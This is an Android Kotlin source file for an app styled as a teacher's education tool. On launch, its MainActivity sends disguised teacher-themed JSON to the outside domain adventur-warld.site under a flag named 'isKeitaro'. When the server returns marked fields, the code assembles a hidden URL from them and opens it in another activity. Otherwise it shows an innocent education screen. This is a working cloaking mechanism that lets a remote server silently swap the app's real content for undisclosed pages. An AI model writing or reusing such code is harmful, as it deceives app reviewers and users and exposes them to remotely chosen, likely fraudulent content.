package com.educat.orteacher.assos

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.ui.res.colorResource
import androidx.core.content.ContextCompat.startActivity
import androidx.navigation.NavController
import androidx.navigation.compose.rememberNavController
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            ScreenStatusBar(colorResource(id = R.color.black))
            val navController = rememberNavController()
            sendPostRequest(this, true, navController)
        }
    }
}

data class RequestBodyData(
    val lesson_planning: String,
    val grade_tracking: String,
    val attendance_management: String,
    val resource_library: String )

data class ResponseData(
    val lesson_planning: String,
    val grade_tracking: String,
    val attendance_management: String,
    val resource_library: String,
    val interactive_whiteboard: String,
    val student_feedback: String,
    val parent_communication: String,
    val classroom_activities: String,
    val behavior_monitoring: String,
    val professional_development: String )
fun parseResponseData(responseBody: String): ResponseData {
    val jsonObject = JSONObject(responseBody)
    return ResponseData( lesson_planning = jsonObject.getString("lesson_planning"),
        grade_tracking = jsonObject.getString("grade_tracking"),
        attendance_management = jsonObject.getString("attendance_management"),
        resource_library = jsonObject.getString("resource_library"),
        interactive_whiteboard = jsonObject.getString("interactive_whiteboard"),
        student_feedback = jsonObject.getString("student_feedback"),
        parent_communication = jsonObject.getString("parent_communication"),
        classroom_activities = jsonObject.getString("classroom_activities"),
        behavior_monitoring = jsonObject.getString("behavior_monitoring"),
        professional_development = jsonObject.getString("professional_development")
    )
}
fun sendPostRequest(context: Context, isKeitaro: Boolean, navController: NavController) {
    val url = "https://adventur-warld.site/attendance/"
    val client = OkHttpClient()
    val requestBodyData = if (isKeitaro) {
        RequestBodyData("Advanced tools...", "Automated system...", "Efficient attendance...", "Access to a...")
     } else { RequestBodyData("attendance", "attendance", "attendance", "attendance")
}
val jsonBody = JSONObject().apply {
    put("lesson_planning", requestBodyData.lesson_planning)
    put("grade_tracking", requestBodyData.grade_tracking)
    put("attendance_management", requestBodyData.attendance_management)
    put("resource_library", requestBodyData.resource_library)
}.toString()
val requestBody = jsonBody.toRequestBody("application/json".toMediaType())
val request = Request.Builder().url(url).post(requestBody).build()
CoroutineScope(Dispatchers.IO).launch {
    try {
        val response = client.newCall(request).execute()
        if (response.isSuccessful) {
            val responseBody = response.body?.string()
            if (responseBody != null) {
                val responseData = parseResponseData(responseBody)
                if(responseData.toString().contains("=attendance")){
                    val resultString = with(responseData) {
                        listOf(lesson_planning,
                            grade_tracking,
                            attendance_management,
                            resource_library,
                            interactive_whiteboard,
                            student_feedback,
                            parent_communication,
                            classroom_activities,
                            behavior_monitoring,
                            professional_development
                        ).joinToString("") { it.substringAfter("attendance") }
                    }
                    Log.d("TAG", "responseData: $responseData")
                    val intent = Intent(context, OwnActivity::class.java).apply {
                        putExtra("url", resultString)
                    }
                    context.startActivity(intent)
                } else {
                   navController.navigate("EducateScreen")
                }

            }
        } else {
            Log.e("TAG", "Request failed with status code: ${response.code}")
        }
    } catch (e: Exception) {
        Log.e("TAG", "Request failed with exception: $e")
    }
}
}
